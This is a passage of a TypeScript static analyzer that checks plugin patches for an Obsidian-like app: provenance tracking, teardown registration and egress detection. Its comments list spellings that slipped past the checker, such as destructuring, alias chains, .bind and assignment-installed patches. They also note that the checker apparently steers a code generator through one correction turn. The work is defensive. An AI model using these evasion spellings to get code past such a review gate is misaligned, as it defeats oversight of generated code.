            vb.member = { receiver: unwrapChain(init), property: key, scope };
            if (key === 'prototype') vb.isPrototype = true;
          }
        }

        if (node.id.type !== 'Identifier' || init === null) return;
        const b = self.lookup(node.id.name, scope);
        if (!b) return;
        // ⚠️ `unwrapValue`, not `unwrapChain`: `const s = (0, activeWindow.setInterval)` is the same
        // detached-method binding written through a sequence expression, and it stripped every
        // defence that reads `Binding.member`.
        const inner = unwrapValue(init);
        b.init = inner;
        self.pathEdges.push({ binding: b, node: init, scope });
        if (inner.type === 'ThisExpression') b.thisOf = scope.thisIsOwned ? scope.cls : null;
        if (inner.type === 'FunctionExpression' || inner.type === 'ArrowFunctionExpression') {
          b.fnNode = inner;
        }
        if (inner.type === 'MemberExpression') {
          b.member = {
            receiver: unwrapChain(inner.object),
            property: propertyName(inner, self.constStrings),
            scope,
          };
        }
        // `const s = cond ? activeWindow.setInterval : null` — a branch is still where the method
        // name lives, and a detached-method binding that loses it strips every rule that reads
        // {@link Binding.member}. Either side counts, because either side may run.
        if (inner.type === 'ConditionalExpression' || inner.type === 'LogicalExpression') {
          const sides =
            inner.type === 'ConditionalExpression'
              ? [inner.consequent, inner.alternate]
              : [inner.left, inner.right];
          for (const side of sides) {
            const m = unwrapValue(side);
            if (m.type !== 'MemberExpression') continue;
            b.member = b.member ?? {
              receiver: unwrapChain(m.object),
              property: propertyName(m, self.constStrings),
              scope,
            };
          }
        }
        // `const on = activeDocument.addEventListener.bind(activeDocument)` — the method's name lives
        // on the *object of the `.bind`*, one hop further out than the direct-initialiser case ever
        // looked, and `.bind` also bakes in arguments the call site never shows.
        const detached = detachedMethodOf(inner, self.constStrings);
        if (detached !== null) {
          b.member = { receiver: detached.receiver, property: detached.property, scope };
          if (detached.boundArgs.length > 0) b.boundArgs = { nodes: detached.boundArgs, scope };
        }
        self.noteBindingKind(b, inner, scope);
      },
      AssignmentExpression(node, _state, ancestors) {
        const scope = self.scopeFor(ancestors);
        if (node.left.type === 'Identifier') {
          const b = self.lookup(node.left.name, scope);
          if (b) self.identEdges.push({ binding: b, node: node.right, scope });
          return;
        }
        if (node.left.type !== 'MemberExpression') return;
        const left = node.left;
        const objNode = unwrapChain(left.object);
        const key = propertyName(left, self.constStrings);
        // `this.h = target.constructor.prototype` — a field on the mod's own object carrying a
        // host holder. Reproduced at zero findings on 2026-08-31.
        const cls = self.thisClassOf(objNode, scope);
        if (cls !== undefined && cls !== null && key !== null) {
          self.fieldEdges.push({ cls, name: key, node: node.right, scope });
          const info = self.field(cls, key);
          if (self.isWindowExpr(unwrapChain(node.right), scope)) info.isWindow = true;
          // `this.socket = new WebSocket(…)` — so `this.socket.send(…)` is recognisable as egress.
          const rhs = unwrapChain(node.right);
          const ctor =
            rhs.type === 'NewExpression'
              ? self.reclaimableCtorOf(rhs.callee, scope)
              : self.ctorOfExpr(rhs, scope);
          if (ctor !== null) self.noteFieldCtor(cls, key, ctor);
          return;
        }
        // `arr[0] = host` — the collection now carries a host value.
        if (objNode.type === 'Identifier') {
          const b = self.lookup(objNode.name, scope);
          if (b) self.collectionEdges.push({ binding: b, node: node.right, scope });
        }
      },
      PropertyDefinition(node, _state, ancestors) {
        if (node.computed || !node.value) return;
        const cls = nearestClassBefore(ancestors, ancestors.length);
        const key =
          node.key.type === 'Identifier'
            ? node.key.name
            : node.key.type === 'PrivateIdentifier'
              ? `#${node.key.name}`
              : staticStringValue(node.key);
        if (!cls || key === null) return;
        self.fieldEdges.push({ cls, name: key, node: node.value, scope: self.scopeFor(ancestors) });
      },
      ClassDeclaration(node, _state, ancestors) {
        self.noteClassMembers(node, self.scopeFor(ancestors.slice(0, -1)), self.scopeFor(ancestors));
      },
      ClassExpression(node, _state, ancestors) {
        self.noteClassMembers(node, self.scopeFor(ancestors), self.scopeFor(ancestors));
      },
      ReturnStatement(node, _state, ancestors) {
        if (!node.argument) return;
        const fn = enclosingFunction(ancestors);
        if (!fn) return;
        const list = self.returnExprs.get(fn) ?? [];
        list.push({ node: node.argument, scope: self.scopeFor(ancestors) });
        self.returnExprs.set(fn, list);
      },
      ArrowFunctionExpression(node, _state, ancestors) {
        if (node.body.type === 'BlockStatement') return;
        const list = self.returnExprs.get(node) ?? [];
        list.push({ node: node.body, scope: self.scopeFor(ancestors) });
        self.returnExprs.set(node, list);
      },
      ForOfStatement(node, _state, ancestors) {
        const scope = self.scopeFor(ancestors);
        const left = node.left.type === 'VariableDeclaration' ? node.left.declarations[0]?.id : node.left;
        if (left) self.patternEdges.push({ pattern: left, init: node.right, scope });
      },
      CallExpression(node, _state, ancestors) {
        const scope = self.scopeFor(ancestors);
        const callee = unwrapChain(node.callee);

        // ── parameters bound from the call site ──
        const fn = self.resolveCallee(node, scope);
        if (fn) {
          self.calledFunctions.add(fn);
          const sources = self.paramSources.get(fn) ?? [];
          const params = self.paramBindings.get(fn) ?? [];
          node.arguments.forEach((arg, i) => {
            if (arg.type === 'SpreadElement') return;
            sources.push({ index: i, node: arg, scope });
            // The first call site also names the parameter, so a pre-flight taken on a helper's
            // parameter is recognisable as the same holder the patch installs on.
            const pb = params[i];
            if (pb && !self.pathEdges.some((e) => e.binding === pb)) {
              self.pathEdges.push({ binding: pb, node: arg, scope });
            }
          });
          self.paramSources.set(fn, sources);
        }

        if (callee.type !== 'MemberExpression') return;
        const method = propertyName(callee, self.constStrings);
        if (method === null) return;
        const recv = unwrapChain(callee.object);

        // ── a value put into a collection flows back into the collection's binding ──
        if (COLLECTION_WRITERS.has(method) && recv.type === 'Identifier') {
          const b = self.lookup(recv.name, scope);
          if (b) {
            for (const arg of node.arguments) {
              if (arg.type === 'SpreadElement') self.collectionEdges.push({ binding: b, node: arg.argument, scope });
              else self.collectionEdges.push({ binding: b, node: arg, scope });
            }
          }
        }

        // ── Object.defineProperty(box, "h", { get() { return holder } }) is a collection write
        //    spelled as a call: the box now hands back whatever the descriptor closes over. ──
        if (
          recv.type === 'Identifier' &&
          MUTATOR_CALLS.get(recv.name)?.has(method) === true &&
          node.arguments.length > 1
        ) {
          const dest = node.arguments[0] === undefined ? null : unwrapChain(node.arguments[0]);
          if (dest !== null && dest.type === 'Identifier') {
            const b = self.lookup(dest.name, scope);
            if (b) {
              for (const arg of node.arguments.slice(1)) {
                if (arg.type === 'SpreadElement') self.collectionEdges.push({ binding: b, node: arg.argument, scope });
                else self.collectionEdges.push({ binding: b, node: arg, scope });
              }
            }
          }
        }

        // ── a callback parameter takes the receiver's provenance ──
        if (CALLBACK_METHODS.has(method)) {
          const cb = node.arguments[0];
          if (cb && (cb.type === 'ArrowFunctionExpression' || cb.type === 'FunctionExpression')) {
            self.calledFunctions.add(cb);
            const sources = self.paramSources.get(cb) ?? [];
            sources.push({ index: 0, node: callee.object, scope });
            self.paramSources.set(cb, sources);
          }
        }
      },
    });

    // A function whose value escapes — handed to a call we do not model, stored in an object, passed
    // by name — can be invoked with anything, so its parameters fail closed.
    walk.ancestor(this.program, {
      FunctionExpression(node, _state, ancestors) {
        if (isEscapingFunction(node, ancestors)) self.escapedFunctions.add(node);
      },
      ArrowFunctionExpression(node, _state, ancestors) {
        if (isEscapingFunction(node, ancestors)) self.escapedFunctions.add(node);
      },
      Identifier(node, _state, ancestors) {
        if (!isIdentifierRead(node, ancestors)) return;
        const parent = ancestors[ancestors.length - 2];
        if (parent?.type === 'CallExpression' && parent.callee === node) return;
        const b = self.lookup(node.name, self.scopeFor(ancestors));
        if (b?.fnNode) self.escapedFunctions.add(b.fnNode);
      },
    });

    // Canonical paths settle the same way provenance does: `const holder = target.constructor
    // .prototype` cannot be expanded until `target`'s own path is known, and source order does not
    // decide which comes first.
    for (let round = 0; round < 4; round++) {
      let grew = false;
      for (const e of this.pathEdges) {
        const p = this.canonicalPath(e.node, e.scope);
        if (p !== null && p !== e.binding.path) {
          e.binding.path = p;
          grew = true;
        }
        // The prototype flag settles the same way and for the same reason: `noteBindingKind` asks
        // the question while the walk that would answer it is still running, so a holder returned
        // by a helper declared *after* its call site would be missed on source order alone.
        if (!e.binding.isPrototype && this.isPrototypeExpr(e.node, e.scope)) {
          e.binding.isPrototype = true;
          grew = true;
        }
      }
      if (!grew) break;
    }
  }

  /** See {@link classMemberEdges}. A class name carries what its own members can hand back. */
  private noteClassMembers(cls: acorn.Class, outer: Scope, inner: Scope): void {
    const id = cls.id;
    if (!id) return;
    const b = this.lookup(id.name, outer) ?? this.lookup(id.name, inner);
    if (!b) return;
    for (const member of cls.body.body) {
      if (member.type === 'MethodDefinition') {
        this.classMemberEdges.push({ binding: b, fn: member.value, node: null, scope: inner });
      } else if (member.type === 'PropertyDefinition' && member.value) {
        this.classMemberEdges.push({ binding: b, fn: null, node: member.value, scope: inner });
      }
    }
  }

  private noteBindingKind(b: Binding, init: acorn.AnyNode, scope: Scope): void {
    if (init.type === 'Identifier') {
      const src = this.lookup(init.name, scope);
      if (src) {
        b.isAround = b.isAround || src.isAround;
        b.isAroundNamespace = b.isAroundNamespace || src.isAroundNamespace;
        b.isCodeLoader = b.isCodeLoader || src.isCodeLoader;
        b.ctorName = b.ctorName ?? src.ctorName;
        b.mutatorName = b.mutatorName ?? src.mutatorName;
        b.isPrototype = b.isPrototype || src.isPrototype;
        b.fnNode = b.fnNode ?? src.fnNode;
        // Aliases of an alias. `const a = this; const b = a; b.app.workspace.getLeaf = fn` and
        // `const s = activeWindow.setInterval; const s2 = s; s2(fn, 100)` are the same two bypasses
        // one hop further out, and both were reproduced at zero findings.
        b.thisOf = b.thisOf ?? src.thisOf;
        b.member = b.member ?? src.member;
      } else {
        if (RECLAIMABLE_CONSTRUCTORS.has(init.name)) b.ctorName = init.name;
        if (MUTATOR_CALLS.has(init.name)) b.mutatorName = init.name;
      }
    }
    if (init.type === 'MemberExpression') {
      const prop = propertyName(init, this.constStrings);
      if (prop === 'constructor') b.isCodeLoader = true;
      if (prop !== null && RECLAIMABLE_CONSTRUCTORS.has(prop)) b.ctorName = prop;
      if (prop === 'prototype') b.isPrototype = true;
      const object = unwrapChain(init.object);
      if (prop === 'around' && object.type === 'Identifier') {
        const src = this.lookup(object.name, scope);
        if (src ? src.isAroundNamespace : this.aroundNamespaceLocals.has(object.name)) b.isAround = true;
      }
    }
    // `const ws = new activeWindow.WebSocket(…)` — so `ws.send(…)` is recognisable as egress and
    // `ws.close()` as its reclaim.
    if (init.type === 'NewExpression') {
      b.ctorName = b.ctorName ?? this.reclaimableCtorOf(init.callee, scope);
    }
    if (this.isPrototypeExpr(init, scope)) b.isPrototype = true;
    if (this.isWindowExpr(init, scope)) b.isWindow = true;
  }

  /**
   * The fixed point.
   *
   * Provenance only ever rises (`join` is `max`), so this terminates. The bound is generous rather
   * than tight: these files are a few hundred lines.
   */
  private solve(): void {
    for (let round = 0; round < 24; round++) {
      let grew = false;
      const raise = (b: Binding, p: Prov): void => {
        const next = joinProv(b.prov, p);
        if (next !== b.prov) {
          b.prov = next;
          grew = true;
        }
      };

      for (const e of this.patternEdges) {
        if (this.bindPattern(e.pattern, e.init, e.scope, raise)) grew = true;
      }
      for (const e of this.identEdges) raise(e.binding, this.provOf(e.node, e.scope));
      for (const e of this.collectionEdges) raise(e.binding, this.provOf(e.node, e.scope));
      // A class name is worth what its own members can hand back: `class Box { static get h() {
      // return holder } }` then `Box.h.getTasks = fn` is the object-literal getter one level up.
      for (const e of this.classMemberEdges) {
        if (e.fn !== null) {
          const rp = this.returnProv.get(e.fn);
          if (rp !== undefined) raise(e.binding, rp);
        }
        if (e.node !== null) raise(e.binding, this.provOf(e.node, e.scope));
      }

      for (const e of this.fieldEdges) {
        const info = this.field(e.cls, e.name);
        const next = joinProv(info.prov, this.provOf(e.node, e.scope));
        if (next !== info.prov) {
          info.prov = next;
          grew = true;
        }
      }

      for (const [fn, exprs] of this.returnExprs) {
        let p: Prov = this.returnProv.get(fn) ?? 'static';
        for (const e of exprs) p = joinProv(p, this.provOf(e.node, e.scope));
        if (p !== this.returnProv.get(fn)) {
          this.returnProv.set(fn, p);
          grew = true;
        }
      }

      for (const [fn, bindings] of this.paramBindings) {
        // ⚠️ A function nobody calls here, or one whose value escapes, can be handed anything. Its
        // parameters are `unknown`, which is `host` — never `owned`.
        const opaque = !this.calledFunctions.has(fn) || this.escapedFunctions.has(fn);
        const sources = this.paramSources.get(fn) ?? [];
        const defaults = this.paramDefaults.get(fn) ?? [];
        bindings.forEach((b, i) => {
          if (!b) return;
          if (opaque) raise(b, 'unknown');
          // ⚠️ The default is a call site too — the one taken whenever the caller passes fewer
          // arguments, which is exactly what `install()` does to `function install(h = holder)`.
          const def = defaults[i];
          if (def) raise(b, this.provOf(def.node, def.scope));
          for (const s of sources) {
            if (s.index !== i) continue;
            raise(b, this.provOf(s.node, s.scope));
          }
        });
        // A rest parameter is declared `unknown` outright by `declareParams` — it collects whatever
        // the caller passed, which is by definition more than any call site here can pin down.
      }

      if (!grew) break;
    }
  }

  /**
   * Destructuring, to any depth, with defaults and rest.
   *
   * `const { prototype } = target.constructor` and `const { workspace } = this.app` were the two
   * cheapest bypasses in the whole set, and both were invisible because provenance was only ever
   * built from `const <Identifier> = …`.
   */
  private bindPattern(
    pattern: acorn.AnyNode,
    init: acorn.AnyNode | null,
    scope: Scope,
    raise: (b: Binding, p: Prov) => void,
    depth = 0,
    /** Set when the caller already resolved this sub-path (a `this.<field>`, an object member). */
    provOverride?: Prov,
  ): boolean {
    if (depth > 12) return false;
    let grew = false;
    const before = (b: Binding): Prov => b.prov;
    const valueProv = (): Prov =>
      provOverride ?? (init === null ? 'unknown' : this.provOf(init, scope));

    switch (pattern.type) {
      case 'Identifier': {
        const b = this.lookup(pattern.name, scope);
        if (!b) return false;
        const p = valueProv();
        const was = before(b);
        raise(b, p);
        return b.prov !== was;
      }
      case 'ObjectPattern': {
        const obj = init === null ? null : unwrapChain(init);
        for (const prop of pattern.properties) {
          if (prop.type === 'RestElement') {
            if (this.bindPattern(prop.argument, init, scope, raise, depth + 1)) grew = true;
            continue;
          }
          const key = prop.computed
            ? staticStringValue(prop.key, this.constStrings)
            : prop.key.type === 'Identifier'
              ? prop.key.name
              : staticStringValue(prop.key, this.constStrings);
          const child = this.memberSourceOf(obj, key, scope);
          if (this.bindPattern(prop.value, child.node, scope, raise, depth + 1, child.prov)) grew = true;
        }
        return grew;
      }
      case 'ArrayPattern': {
        const obj = init === null ? null : unwrapChain(init);
        pattern.elements.forEach((el, i) => {
          if (!el) return;
          let child: acorn.AnyNode | null = init;
          if (obj?.type === 'ArrayExpression') {
            const e = obj.elements[i];
            child = e && e.type !== 'SpreadElement' ? e : null;
          }
          if (this.bindPattern(el.type === 'RestElement' ? el.argument : el, child, scope, raise, depth + 1))
            grew = true;
        });
        return grew;
      }
      case 'AssignmentPattern': {
        if (this.bindPattern(pattern.left, init, scope, raise, depth + 1)) grew = true;
        if (this.bindPattern(pattern.left, pattern.right, scope, raise, depth + 1)) grew = true;
        return grew;
      }
      case 'RestElement':
        return this.bindPattern(pattern.argument, init, scope, raise, depth + 1);
      default:
        return false;
    }
  }

  /**
   * The value a destructured key takes: the matching property of an object literal, the right
   * `this.<field>`, or — for anything else — the object's own provenance, because a property of a
   * host object is the host's.
   */
  private memberSourceOf(
    obj: acorn.AnyNode | null,
    key: string | null,
    scope: Scope,
  ): { node: acorn.AnyNode | null; prov: Prov } {
    if (obj === null) return { node: null, prov: 'unknown' };
    if (obj.type === 'ObjectExpression' && key !== null) {
      for (const prop of obj.properties) {
        if (prop.type !== 'Property' || prop.computed) continue;
        const k = prop.key.type === 'Identifier' ? prop.key.name : staticStringValue(prop.key);
        if (k === key) return { node: prop.value, prov: this.provOf(prop.value, scope) };
      }
    }
    const cls = this.thisClassOf(obj, scope);
    if (cls !== undefined) {
      if (cls === null || key === null) return { node: null, prov: 'unknown' };
      return { node: null, prov: this.fieldProv(cls, key).prov };
    }
    return { node: obj, prov: this.provOf(obj, scope) };
  }

  /* ────────────────────────────────────────────────────────────────────────
   * Sanctioned acquisition sites, and the reclaim ledger
   * ──────────────────────────────────────────────────────────────────────── */

  private collectSanctions(): void {
    const self = this;
    walk.ancestor(this.program, {
      CallExpression(node, _state, ancestors) {
        const scope = self.scopeFor(ancestors);
        if (isRegisterCall(node)) {
          const method = calleeProperty(node.callee, self.constStrings);
          const arg0 = node.arguments[0];

          if (method === 'registerDomEvent' && arg0) {
            // Argument 0 only: the element expression. The handler body is ordinary code.
            markIdentifiers(arg0, self.sanctionedGlobals);
          }

          if (method === 'registerEvent' && arg0) {
            self.sanctionedEvents.add(unwrapChain(arg0));
            if (arg0.type === 'Identifier') {
              const init = self.lookup(arg0.name, scope)?.init;
              if (init) self.sanctionedEvents.add(unwrapChain(init));
            }
          }

          if (method === 'registerInterval' && arg0 && arg0.type === 'CallExpression') {
            const callee = arg0.callee;
            if (
              callee.type === 'MemberExpression' &&
              !callee.computed &&
              callee.property.type === 'Identifier' &&
              (callee.property.name === 'setInterval' || callee.property.name === 'setTimeout') &&
              self.isWindowExpr(callee.object, scope)
            ) {
              self.sanctionedTimers.add(arg0);
              const receiver = unwrapChain(callee.object);
              if (receiver.type === 'Identifier') self.sanctionedGlobals.add(receiver);
            }
          }

          if (method === 'register') {
            // ⚠️ ARGUMENT 0 ONLY. `Component.register(cb)` takes exactly one callback, so
            // `this.register(around(h, {a}), around(h, {b}))` sanctioned both here and dropped the
            // second uninstaller at runtime — that patch survived disable *and* uninstall forever.
            const arg = node.arguments[0];
            if (arg !== undefined) {
              self.sanctionUninstaller(arg, scope);
              if (arg.type === 'CallExpression') {
                // One level of wrapping, so the template's try/catch guard is accepted while an
                // arbitrary closure that merely *contains* around() is not.
                //
                // ⚠️ **Only the arguments the wrapper can actually RECEIVE.** This loop used to walk
                // every argument, so `safe(around(h, {a}), around(h, {b}))` — where `safe` takes one
                // parameter — sanctioned both while the second uninstaller was dropped on the floor
                // by JavaScript itself. The correction loop was therefore being pushed *toward* the
                // unsafe spelling: the honest multi-patch forms below were rejected and this one was
                // not.
                const target = self.resolveCallee(arg, scope);
                const arity = target === null ? 1 : (self.paramBindings.get(target) ?? []).length;
                arg.arguments.slice(0, arity).forEach((inner) => self.sanctionUninstaller(inner, scope));
              }
              // ── the reachability relaxation ──
              //
              // `const offs = [around(a, …), around(b, …)]; this.register(() => offs.forEach(f => f()))`
              // is the ONLY correct way to reclaim two patches on two holders in one register call,
              // and it was rejected — measured, on three spellings. A rejection of the safe form is
              // not neutral: generation gets one correction turn, so it actively teaches the unsafe
              // one. An uninstaller whose value is reachable from the registered callback IS
              // registered.
              self.sanctionReachable(arg, scope);
            }
          }
        }

        if (self.isAroundCall(node, scope)) {
          if (self.firstAround === null || node.start < self.firstAround.start) {
            self.firstAround = node;
          }
          const holder = node.arguments[0];
          if (holder && self.isPrototypeExpr(holder, scope)) self.patchesPrototype = true;
          if (holder) {
            self.noteInstall(node, holder, scope, enclosingFunction(ancestors));
            for (const k of objectKeys(node.arguments[1], self.constStrings)) self.installMembers.add(k);
          }
          self.installNodes.add(node);
          self.noteWrappers(node.arguments[1]);
        }
      },
      /**
       * A patch installed **by assignment** is still a patch install.
       *
       * The host-protecting rules were rewritten to ask the lattice; the contract rules were left
       * asking whether the file contained an `around()` call. So a mod that wrote
       * `view.getTasks = function patched(…)` skipped the version gate, the accessor pre-flight and
       * the bound-method check in complete silence, and a matched pair of otherwise-identical mods
       * proved it: the `around()` one was rejected three times over, the assignment one shipped.
       */
      AssignmentExpression(node, _state, ancestors) {
        if (node.left.type !== 'MemberExpression') return;
        const scope = self.scopeFor(ancestors);
        const recv = unwrapChain(node.left.object);
        if (!isHostish(self.provOf(recv, scope))) return;
        // A *patch* is a function written onto a member. `this.app.x = 1` is a host write and is
        // reported as one; it is not an install, and does not owe a version gate.
        const rhs = unwrapValue(node.right);
        const isFn =
          isFunctionNode(rhs) ||
          (rhs.type === 'Identifier' && (self.lookup(rhs.name, scope)?.fnNode ?? null) !== null);
        if (!isFn) return;
        if (self.isPrototypeExpr(recv, scope)) self.patchesPrototype = true;
        self.noteInstall(node, recv, scope, enclosingFunction(ancestors));
        const key = propertyName(node.left, self.constStrings);
        if (key !== null) self.installMembers.add(key);
      },
      PropertyDefinition(node) {
        if (node.computed || node.key.type !== 'Identifier' || node.key.name !== 'modkitProbe') return;
        const value = node.value ? unwrapChain(node.value) : null;
        if (value !== null && isFunctionNode(value) && probeReports(value as acorn.Function)) {
          self.hasProbe = true;
        }
      },
    });
  }

  /** One `this.register(x)` argument that names an uninstaller: the call, or a binding holding it. */
  private sanctionUninstaller(arg: acorn.AnyNode, scope: Scope): void {
    if (this.isAroundCall(arg, scope)) {
      this.sanctionedAround.add(unwrapChain(arg));
      return;
    }
    if (arg.type !== 'Identifier') return;
    const init = this.lookup(arg.name, scope)?.init;
    if (init && this.isAroundCall(init, scope)) this.sanctionedAround.add(init);
  }

  /**
   * Every uninstaller **reachable from** a registered teardown callback.
   *
   * The rule the reclaim contract really wants is "when this callback runs, does the patch come
   * back out?". Lexical shape answers that for the one-patch case and nothing else, so the honest
   * multi-patch forms — an array of uninstallers, walked by a `for…of` or a `forEach` inside a single
   * `this.register(...)` — were refused while the shape that silently drops an uninstaller was
   * accepted. Reachability is asked here of the value graph the lattice already built: an identifier
   * read anywhere inside the callback carries whatever around() calls flowed into its binding.
   */
  private sanctionReachable(arg: acorn.AnyNode, scope: Scope): void {
    const cb = unwrapValue(arg);
    // The callback itself, or a method it names: `this.register(this.uninstallAll.bind(this))`.
    const fn = isFunctionNode(cb)
      ? (cb as acorn.Function)
      : cb.type === 'Identifier'
        ? this.lookup(cb.name, scope)?.fnNode ?? null
        : cb.type === 'MemberExpression'
          ? this.methodOf(cb, scope)
          : null;
    if (fn === null) return;
    const body = fn.body as PositionedNode & { end: number };
    this.registeredRegions.push({ start: body.start, end: body.end });
  }

  /** The class method a `this.<name>` / `this.#name` expression names, when the file has it. */
  private methodOf(node: acorn.MemberExpression, scope: Scope): acorn.Function | null {
    const key = propertyName(node, this.constStrings);
    const cls = this.thisClassOf(unwrapChain(node.object), scope);
    if (key === null || cls === undefined || cls === null) return null;
    return this.classMethods.get(cls)?.get(key) ?? null;
  }

  /** See {@link wrapperBodies} — the function an `around()` spec hands back, per member. */
  private noteWrappers(spec: acorn.AnyNode | undefined): void {
    if (spec === undefined) return;
    const obj = unwrapChain(spec);
    if (obj.type !== 'ObjectExpression') return;
    for (const prop of obj.properties) {
      if (prop.type !== 'Property' || prop.computed) continue;
      const member =
        prop.key.type === 'Identifier' ? prop.key.name : staticStringValue(prop.key, this.constStrings);
      if (member === null) continue;
      const factory = unwrapChain(prop.value);
      if (!isFunctionNode(factory)) continue;
      const wrapper = returnedFunctionOf(factory as acorn.Function);
      if (wrapper !== null) this.wrapperBodies.push({ node: wrapper, member });
    }
  }

  /** The earliest place the mod installs a patch, however it spelled it. */
  private noteInstall(
    node: PositionedNode,
    holder: acorn.AnyNode,
    scope: Scope,
    fn: acorn.Function | null,
  ): void {
    if (this.firstInstall !== null && this.firstInstall.start <= node.start) return;
    this.firstInstall = node;
    this.installHolder = { node: holder, scope };
    this.firstAroundFn = fn;
    const path = this.canonicalPath(holder, scope);
    // `leaf.view.constructor.prototype` is a class the app happened to be holding; `Workspace
    // .prototype` is Obsidian's own. Only the second is covered by requireApiVersion().
    //
    // ⚠️ The path test alone is not the question, it is one *spelling* of it: `const holder =
    // protoOf(leaf.view)` has no nameable path at all, so a one-line helper made the whole gate
    // collapse back onto `requireApiVersion()`. A prototype whose path cannot be named was, by
    // construction, dug out of something obtained at runtime.
    const named = path !== null && /\.constructor\.prototype$/.test(path);
    const fromObsidian = this.obsidianLocalNames.has(path?.split('.')[0] ?? '');
    this.patchesDerivedPrototype =
      !fromObsidian && (named || this.isPrototypeExpr(holder, scope));
  }

  /* ────────────────────────────────────────────────────────────────────────
   * The reclaim ledger
   * ──────────────────────────────────────────────────────────────────────── */

  /**
   * Everything the mod gives back, keyed on {@link reclaimKey}.
   *
   * Three sources, and the second and third are why this replaced a walk over
   * `this.register(...)`'s own arguments:
   *
   *  - **`this.register(cb)`** — the sanctioned form, argument 0 only.
   *  - **`onunload()`** — Obsidian's own documented teardown hook, which the old ledger rejected.
   *  - **a teardown reached through a helper**: `this.register(() => this.teardown(s))`,
   *    `this.register(this.cleanup.bind(this))`, `this.register(this.cleanup)`. Each is a *correct*
   *    reclaim that was refused, and a false rejection here is not neutral — generation gets one
   *    correction turn, so refusing three correct spellings pushes the model toward the one accepted
   *    spelling, which was exactly the spelling that poisoned the old global name bag.
   *
   * Delegation is followed with a caller→callee substitution on keys, so `teardown(s)`'s parameter
   * is understood to be the caller's `s` and nothing else. Run to a small fixed point, because a
   * helper may delegate again.
   */
  private collectTeardowns(): void {
    const self = this;
    const addRegion = (node: PositionedNode & { end?: number }, subst: Map<string, string>): void => {
      const end = typeof node.end === 'number' ? node.end : node.start;
      if (self.teardownRegions.length > 256) return;
      if (self.teardownRegions.some((r) => r.start === node.start && r.end === end && sameSubst(r.subst, subst))) {
        return;
      }
      self.teardownRegions.push({ start: node.start, end, subst });
    };

    /** The function a `this.register(x)` argument, or a delegated call, actually runs. */
    const targetFn = (expr: acorn.AnyNode, scope: Scope): acorn.Function | null => {
      const inner = unwrapValue(expr);
      if (inner.type === 'Identifier') return this.lookup(inner.name, scope)?.fnNode ?? null;
      if (inner.type === 'MemberExpression') {
        const key = propertyName(inner, this.constStrings);
        const cls = this.thisClassOf(unwrapChain(inner.object), scope);
        if (key !== null && cls !== undefined && cls !== null) {
          return this.classMethods.get(cls)?.get(key) ?? null;
        }
        return null;
      }
      return null;
    };

    const record = (child: acorn.CallExpression, scope: Scope, subst: Map<string, string>): void => {
      const callee = unwrapChain(child.callee);
      if (callee.type !== 'MemberExpression') return;
      const method = propertyName(callee, this.constStrings);
      if (method === null || !TEARDOWN_CALLS.has(method)) return;
      const map = (k: string | null): string | null => (k === null ? null : (subst.get(k) ?? k));
      // ⚠️ **A DESTRUCTIVE teardown only gives back what the mod OWNS.**
      //
      // `empty`, `remove`, `detach` and `removeChild` are in TEARDOWN_CALLS, and on a *host* receiver
      // they are not a reclaim at all — they are the damage:
      // `this.app.workspace.leftSplit.containerEl.empty()` wipes Obsidian's sidebar, and the ledger
      // used to *credit* the mod with reclaiming it.
      //
      // The gate is per-method and not blanket, because the rest of the vocabulary is exactly how a
      // mod gives a host object back: `el.removeClass(…)` on an element Obsidian owns undoes a class
      // the mod added, `ws.offref(ref)` undoes a subscription, and refusing those would reject the
      // sanctioned form (`this.register(() => el.removeClass("x"))`) — a false rejection of the very
      // shape `must-be-reclaimed`'s own message asks for. Arguments are recorded either way.
      const destructive = DESTRUCTIVE_TEARDOWNS.has(method);
      const recvOwned = !isHostish(this.provOf(unwrapChain(callee.object), scope));
      const recv = destructive && !recvOwned ? null : map(this.reclaimKey(callee.object, scope));
      if (recv !== null) {
        this.reclaimedKeys.add(recv);
        let set = this.reclaimedTeardowns.get(method);
        if (!set) {
          set = new Set();
          this.reclaimedTeardowns.set(method, set);
        }
        set.add(recv);
      }
      for (const a of child.arguments) {
        const k = map(this.reclaimKey(a, scope));
        if (k !== null) this.reclaimedKeys.add(k);
      }
    };

    /** `this.teardown(s)` inside a region: follow it, translating the argument keys. */
    const delegate = (
      fn: acorn.Function,
      args: readonly acorn.AnyNode[],
      scope: Scope,
      subst: Map<string, string>,
    ): void => {
      const params = this.paramBindings.get(fn) ?? [];
      const next = new Map<string, string>();
      params.forEach((pb, i) => {
        const arg = args[i];
        if (!pb || arg === undefined) return;
        const k = this.reclaimKey(arg, scope);
        if (k === null) return;
        next.set(`v:${pb.uid}`, subst.get(k) ?? k);
      });
      addRegion(fn.body as PositionedNode & { end: number }, next);
    };

    for (let round = 0; round < 4; round++) {
      const before = this.teardownRegions.length;
      const seen = this.reclaimedKeys.size;
      walk.ancestor(this.program, {
        MethodDefinition(node) {
          if (node.computed || node.key.type !== 'Identifier') return;
          if (!TEARDOWN_HOOKS.has(node.key.name)) return;
          addRegion(node.value.body as PositionedNode & { end: number }, new Map());
        },
        CallExpression(node, _state, ancestors) {
          const scope = self.scopeFor(ancestors);
          if (isRegisterCall(node) && calleeProperty(node.callee, self.constStrings) === 'register') {
            const arg = node.arguments[0];
            if (arg !== undefined) {
              addRegion(arg as PositionedNode & { end: number }, new Map());
              // `this.register(this.cleanup)` / `this.register(this.cleanup.bind(this))` — the
              // teardown is a method, and the register argument merely names it.
              const direct = targetFn(arg, scope);
              if (direct) addRegion(direct.body as PositionedNode & { end: number }, new Map());
              const bound = detachedMethodOf(unwrapValue(arg), self.constStrings);
              if (bound !== null && bound.property !== null) {
                const cls = self.thisClassOf(unwrapChain(bound.receiver), scope);
                const viaBind =
                  cls !== undefined && cls !== null
                    ? (self.classMethods.get(cls)?.get(bound.property) ?? null)
                    : bound.receiver.type === 'Identifier'
                      ? (self.lookup(bound.receiver.name, scope)?.fnNode ?? null)
                      : null;
                if (viaBind) delegate(viaBind, bound.boundArgs, scope, new Map());
              }
            }
          }
          const regions = self.teardownRegions.filter((r) => node.start >= r.start && node.end <= r.end);
          if (regions.length === 0) return;
          for (const r of regions) {
            record(node, scope, r.subst);
            const fn = targetFn(node.callee, scope);
            if (fn) delegate(fn, node.arguments, scope, r.subst);
          }
        },
      });
      if (this.teardownRegions.length === before && this.reclaimedKeys.size === seen) break;
    }
  }

  /* ────────────────────────────────────────────────────────────────────────
   * The three refusal rules, bound to subject AND consequence
   * ──────────────────────────────────────────────────────────────────────── */

  private resolveContract(): void {
    const consts = this.constStrings;
    const descriptorCalls: DescriptorCall[] = [];
    const shadowChecks: (string | null)[] = [];
    const callArgPaths = new Map<string, string[]>();
    /**
     * Value-flow, for binding a measurement to the test that uses it.
     *
